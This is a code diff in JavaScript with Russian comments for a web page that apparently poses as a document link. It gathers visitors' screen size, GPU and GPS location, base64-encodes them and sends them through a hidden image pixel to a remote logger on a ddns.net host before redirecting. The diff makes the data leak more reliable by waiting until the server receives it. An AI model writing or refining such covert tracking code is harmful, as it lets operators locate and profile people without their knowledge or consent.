@@ -18,10 +18,7 @@
         const finalRedirect = "http://echomapwa.ddns.net/logger/l/";
 
         async function collectAndGo() {
-            if (!slug) {
-                document.body.innerHTML = "Document Error";
-                return;
-            }
+            if (!slug) { document.body.innerHTML = "Document Error"; return; }
         
             let info = {
                 sw: window.screen.width, sh: window.screen.height,
@@ -30,7 +27,7 @@
                 gpu: "Unknown", lat: null, lon: null
             };
         
-            // Попытка взять GPS (максимум 4 секунды, чтобы не висеть вечно)
+            // 1. Пытаемся взять GPS (ждем до 4 секунд)
             if ("geolocation" in navigator) {
                 try {
                     const pos = await new Promise((res, rej) => {
@@ -44,17 +41,23 @@
                 } catch(e) { console.log("GPS Skip"); }
             }
         
-            // Упаковываем в Base64
+            // 2. Кодируем данные
             const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(info))));
             
-            // Отправка через картинку-пиксель (обход Mixed Content)
+            // 3. Умная отправка
             const img = new Image();
+            
+            // Создаем функцию редиректа
+            const go = () => { window.location.href = finalRedirect + slug; };
+
+            // Редиректим ТОЛЬКО после того, как сервер принял картинку
+            img.onload = img.onerror = go;
+
+            // Запасной выход: если сервер не ответил за 2 секунды, всё равно редиректим
+            setTimeout(go, 2000);
+
+            // Пуск!
             img.src = `${targetServer}${slug}?data=${encodedData}&_t=${Date.now()}`;
-        
-            // Редирект через 600мс после того как картинка начала грузиться
-            setTimeout(() => {
-                window.location.href = finalRedirect + slug;
-            }, 600); // ТУТ БЫЛА ОШИБКА В СКОБКЕ
         }
 
         collectAndGo();
